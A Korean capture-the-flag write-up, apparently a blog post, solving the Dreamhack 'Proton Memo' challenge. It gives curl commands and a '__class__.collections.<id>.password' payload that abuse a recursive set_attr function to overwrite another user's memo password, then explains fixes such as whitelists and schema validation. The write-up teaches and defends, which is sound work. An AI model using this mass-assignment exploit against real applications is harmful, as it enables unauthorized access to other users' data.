---
layout: post
title:  "Dreamhack 워게임 Proton Memo 풀이 — set_attr dotted-path 로 `__class__.collections` 까지 도달, 남의 메모 비밀번호 덮어쓰기"
date:   2026-05-20 16:30:00 +0900
categories: security web wargame dreamhack writeup python prototype-pollution mass-assignment
---

## 들어가며

Dreamhack 웹해킹 워게임 **Proton Memo** (난이도 별 1, 풀이자 358명) 풀이입니다. 평범해 보이는 Flask 메모 앱 안에 **"점(`.`) 으로 분리된 속성 경로를 따라 객체를 재귀적으로 setattr 하는" `set_attr` 함수가 한 마디 짧게 들어 있고** — 그 함수가 사용자 입력으로 **`__class__.collections.<other_memo_id>.password`** 같은 경로를 받아들이는 게 함정. Python 판 "프로토타입 폴루션 / mass assignment" 입니다.

문제 설명:

> 기본적인 기능만 존재하는 메모 앱입니다. 플래그를 얻기 위해 비밀 메모를 읽어주세요!

스포일러 결론(요약):

```bash
SERVER="http://host3.dreamhack.games:PORT"

# 1) 홈에서 secret memo 의 UUID 확인 (모든 메모 UUID 가 노출됨)
SECRET=$(curl "$SERVER/" | grep -oE '/view/[a-f0-9-]{36}' | head -1 | sed 's|/view/||')

# 2) 내 메모 생성 (password=x)
curl -X POST "$SERVER/new" -d "title=mine&content=mine&password=x"
MY=$(curl "$SERVER/" | grep -oE '/view/[a-f0-9-]{36}' | tail -1 | sed 's|/view/||')

# 3) 내 메모를 인증해 edit. selected_option 에 클래스 변수 경로 + UUID + password 를 박는다
NEWHASH=$(python3 -c "import hashlib;print(hashlib.sha256(b'newpw').hexdigest())")
curl -X POST "$SERVER/edit/$MY" \
  --data-urlencode "selected_option=__class__.collections.${SECRET}.password" \
  --data-urlencode "edit_data=$NEWHASH" \
  --data-urlencode "password=x"

# 4) 위에서 새로 정한 비번 newpw 로 secret 메모를 view → flag 출력
curl -X POST "$SERVER/view/$SECRET" -d "password=newpw"
# → Title: secret  ... Content: DH{2ba1c1...}
```

획득한 플래그: **`DH{2ba1c1e3012a56fcce00b51d3d1fcc230bf8683d66b81775c10ef83de2e7cca7}`**.

## 1. 자료 파악

ZIP 안 핵심 두 파일:

- `app.py` — Flask 라우트.
- `utils.py` — **`set_attr` 한 함수만** 들어 있음.

### 1.1 `set_attr` — 위험한 dotted-path 재귀

```python
def set_attr(obj, prop, value):
    prop_chain = prop.split('.')
    cur_prop = prop_chain[0]
    if len(prop_chain) == 1:
        if isinstance(obj, dict):
            obj[cur_prop] = value
        else:
            setattr(obj, cur_prop, value)
    else:
        if isinstance(obj, dict):
            if cur_prop in obj:
                next_obj = obj[cur_prop]
            else:
                next_obj = {}
                obj[cur_prop] = next_obj
        else:
            if hasattr(obj, cur_prop):
                next_obj = getattr(obj, cur_prop)
            else:
                next_obj = {}
                setattr(obj, cur_prop, next_obj)
        set_attr(next_obj, '.'.join(prop_chain[1:]), value)
```

요약하자면 `set_attr(obj, "a.b.c", v)` 가 `obj.a.b.c = v` 와 동일. **객체와 dict 가 섞여도** 자동으로 적절한 방법으로 (`obj[key]` vs `getattr/setattr`) 내려감.

### 1.2 메모 모델

```python
class Memo:
    collections: Dict[str, Memo] = {}   # 클래스 변수 — 모든 메모 사전
    title: Title
    content: Content
    password: Password
    ...
```

- `Memo.collections` 는 **클래스 변수** (인스턴스가 아닌 클래스에 붙어 있음).
- 모든 메모는 여기에 등록됨. **secret 메모도 포함.**

### 1.3 edit 라우트

```python
@app.route("/edit/<uuid:memo_id>", methods=["POST"])
def edit_memo(memo_id: UUID):
    selected_option = request.form["selected_option"]
    edit_data       = request.form["edit_data"]
    password        = request.form["password"]

    memo = get_memo_with_auth_or_abort(memo_id, password)   # ← password 검증

    set_attr(memo, selected_option + ".data", edit_data)
    set_attr(memo, selected_option + ".edit_time", time.time())
    return redirect(url_for("index"))
```

- 핵심: **인증은 URL 의 memo_id 에 대해서만**. 내 memo_id 에 대해 내 password 만 알면 통과.
- 그 뒤 `set_attr(memo, <user-controlled-string>+".data", <user-controlled-string>)` — 사용자가 set_attr 의 path 와 value 를 **모두** 통제.

→ 인증한 memo 에서 출발해서 **그 객체 그래프를 따라 무한정 이동** 가능. Python 객체는 `__class__` 로 자기 클래스에 도달할 수 있고, 거기서 다시 클래스 변수 `collections` 로 이동, 그리고 임의 UUID 키로 다른 메모 객체에 도달, 그 메모의 `password` 로 도달, **그 password 의 data 를 우리가 정한 sha256 으로 덮어쓰기**.

## 2. 페이로드 설계

원하는 경로:

```
my_memo                       ← /edit/<my_id> 로 인증
  .__class__                  → Memo class
  .collections                → 클래스 변수 dict
  .<SECRET_ID>                → secret memo
  .password                   → Password 객체
  .data                       ← 마지막에 setattr 로 덮어씀
```

따라서 `selected_option = "__class__.collections.<SECRET_ID>.password"` 로 두면 `set_attr` 의 마지막 라인 (`+ ".data"`) 까지 합쳐서:

```
__class__.collections.<SECRET_ID>.password.data
```

가 만들어지고, `Memo.collections[SECRET_ID].password.data = edit_data` 가 실행됨.

`edit_data` 는 새 비밀번호의 SHA-256 해시 (Password 가 `data` 에 sha256 hexdigest 를 보관하기 때문). `check_password()` 가 `self.data == sha256(input).hexdigest()` 이므로 hash 만 맞으면 임의의 평문으로 인증 가능.

`set_attr` 한 번 더:

```python
set_attr(memo, selected_option + ".edit_time", time.time())
```

이건 `__class__.collections.<SECRET_ID>.password.edit_time = time.time()` 을 만듦. Password 객체에는 `edit_time` 속성이 원래 없지만 setattr 가 그냥 만들어 줌. **부수 효과 없음 — 무시 가능**.

## 3. 익스플로잇

### 3.1 secret 메모 UUID 발견

홈페이지 `index.html` 이 모든 메모 (id, title) 리스트를 그대로 노출:

```python
memo_title_list = [(memo.id, memo.get_title()) for memo in Memo.collections.values()]
```

→ secret 메모가 있는 것을 알 수 있고, UUID 도 함께 보임. (출제자가 의도적으로 ID 를 숨기지 않음.)

```
/view/c8f453d3-98da-4f2e-81a3-0c488fdc01b0   ← secret
```

### 3.2 내 메모 생성

```bash
curl -X POST "$SERVER/new" \
  --data-urlencode "title=mine" \
  --data-urlencode "content=mine" \
  --data-urlencode "password=x"
# 302 / → 홈에 내 메모 추가됨. 내 ID 도 홈에서 확인.
```

### 3.3 비밀번호 덮어쓰기 + 메모 열기

```bash
SECRET="c8f453d3-98da-4f2e-81a3-0c488fdc01b0"
MY="dfac5e93-9e93-478f-a8bc-ae1788d9a576"
NEWHASH=$(python3 -c "import hashlib;print(hashlib.sha256(b'newpw').hexdigest())")

curl -X POST "$SERVER/edit/$MY" \
  --data-urlencode "selected_option=__class__.collections.${SECRET}.password" \
  --data-urlencode "edit_data=$NEWHASH" \
  --data-urlencode "password=x"
# 302 → secret 메모의 password 가 갈아끼워짐

curl -X POST "$SERVER/view/$SECRET" --data-urlencode "password=newpw"
# 200 → Content: DH{...} 출력
```

플래그 회수 완료.

> 비유: 사물함 마스터키가 따로 있는 게 아니라, **사물함이 같은 큰 진열장에 다 매달려 있는 구조**. 내 사물함을 열면 그 안에서 진열장 전체로 손을 뻗어 옆 사물함의 자물쇠를 통째로 갈아끼울 수 있는 그림.

## 4. 안전하게 고치기

### 4.1 사용자 입력으로 속성 경로를 만들지 말 것

가장 본질적인 해결: **`set_attr(obj, user_input, value)` 같은 패턴 자체를 금지**. 어떤 검증을 추가해도 dunder 속성 (`__class__`, `__dict__`, `__globals__`, `__bases__`, `__mro__` 등) 우회 가능성이 너무 많음.

대신 **명시적 화이트리스트**:

```python
ALLOWED = {"title", "content"}
if selected_option not in ALLOWED:
    abort(400)
getattr(memo, selected_option).data = edit_data
```

### 4.2 `__class__`, `__` prefix 차단

만약 어쩔 수 없이 동적 속성 접근이 필요하다면:

```python
def safe_set_attr(obj, prop, value):
    for part in prop.split('.'):
        if part.startswith('_'):
            raise ValueError("private attribute access")
    set_attr(obj, prop, value)
```

이건 부분적 해결책. 우회 (인코딩, 다른 dunder 등) 가능성이 있어 여전히 위험. 강력한 화이트리스트가 정공법.

### 4.3 mutable class variable 피하기

`collections: Dict[str, Memo] = {}` 같이 **클래스 레벨 mutable** 은 일반적으로 안티패턴. 인스턴스 변수 또는 외부 저장소 (DB) 로 옮기면 `__class__.collections` 경로 자체가 사라짐.

### 4.4 Pydantic / dataclass + 명시적 update 패턴

```python
from pydantic import BaseModel

class MemoUpdate(BaseModel):
    title: str | None = None
    content: str | None = None

@app.route(...)
def edit_memo():
    update = MemoUpdate(**request.form)   # 알 수 없는 키는 자동 거부
    memo = ...
    if update.title is not None: memo.title.data = update.title
    if update.content is not None: memo.content.data = update.content
```

타입과 키 모두 schema 로 좁힘. mass assignment 의 표준 방어.

## 5. 한 번 더 정리

### 5.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `set_attr(obj, user_input, ...)` | Mass Assignment / Improper Authorization (CWE-915) | 사용자 입력으로 속성 경로 통제 |
| `__class__.collections` 접근 | Python Prototype Pollution-like | mutable class variable + 무제한 traversal |
| 홈에서 모든 UUID 노출 | Information Exposure | 인덱스가 인증 없이 secret 메모 ID 까지 표시 |
| 한 메모의 password 만 알면 임의 객체 수정 | Insufficient Authorization | 자원별 권한 검사가 라우트 입력에만 |

### 5.2 입문자가 챙겨가면 좋은 시각

- **JS 에 prototype pollution 이 있다면 Python 엔 `__class__` / `__dict__` / `__globals__` 가 있다**. 다른 언어에서 같은 패턴이 다른 이름으로 살아 있을 가능성을 항상 의심.
- **mass assignment / dotted path / dynamic attribute set** 류의 코드는 거의 항상 위험. ORM 의 `update(**data)`, Rails `params.permit`, Django `Model(**data)` 도 같은 위험 패밀리.
- **인증 검사를 자원이 아니라 입력 ID 에만 거는 함정**. 진짜 검사해야 할 것은 "조작 대상 자원에 대한 권한" 이지 "URL 의 id 에 대한 권한" 이 아니다.

## 6. 시도했지만 실패한 것들 (회고)

### 6.1 첫 가설 — 내 메모의 password 만 바꾸면 되는 줄 알았음

처음엔 "내 메모의 password 를 바꾸면 secret 도 같은 패스워드로 바뀌나?" 라고 잠깐 착각. 30초만에 "아니 메모마다 별개 Password 객체" 라는 걸 확인하고 다음 가설로.

**회고**: 객체 그래프 모델링을 종이/머릿속에 한 번 그리는 게 빠르다. UML 같은 거창한 거 아니고 "Memo → Title, Content, Password → 각자 data 속성" 정도면 충분. 모델 확인이 안 된 채 페이로드부터 짜면 무조건 헛수고.

### 6.2 dotted path 의 끝 처리

`selected_option + ".data"` 가 self.data 까지 정확히 도달하는지 손으로 한 번 시뮬레이션 했음:

```
selected_option = "__class__.collections.UUID.password"
+ ".data" = "__class__.collections.UUID.password.data"

set_attr(my_memo, "__class__.collections.UUID.password.data", NEWHASH)
  → cur="__class__"  → next=Memo
    → cur="collections" → next=dict
      → cur="UUID" → next=secret_memo
        → cur="password" → next=secret.password
          → cur="data", chain.len=1 → setattr(secret.password, "data", NEWHASH) ✓
```

이 시뮬레이션에서 한 단계라도 잘못 짚으면 페이로드 헛수고. **재귀 함수는 코드에서 한 번 손으로 따라가 보는 게 항상 valuable**.

### 6.3 edit_time 부수 효과

`set_attr(memo, selected_option + ".edit_time", time.time())` 두 번째 호출도 같은 경로를 따라 `secret.password.edit_time = <float>` 를 만들어냄. Password 클래스에 원래 `edit_time` 슬롯이 없어서 dynamic 으로 생성. **다행히 부수 효과가 인증/뷰 로직에 영향 없음** — 만약 Password 가 `__slots__` 를 갖고 있었다면 AttributeError 가 났을 것. 그러면 페이로드가 절반에서 깨졌을 수 있고, 작전 변경이 필요했을 듯.

**회고**: 코드 안에 **"한 번에 두 set_attr 호출이 일어난다"** 같은 미세 구조를 보고도 무시하고 페이로드만 짜면 가끔 이런 부수 효과에 발목 잡힘. 가능하면 모든 호출 라인을 머릿속에서 추적.

---

`set_attr(obj, user_input_path, ...)` 형태의 함수는 거의 항상 위험합니다. **dotted-path 동적 속성 접근은 화이트리스트로 좁히세요**.
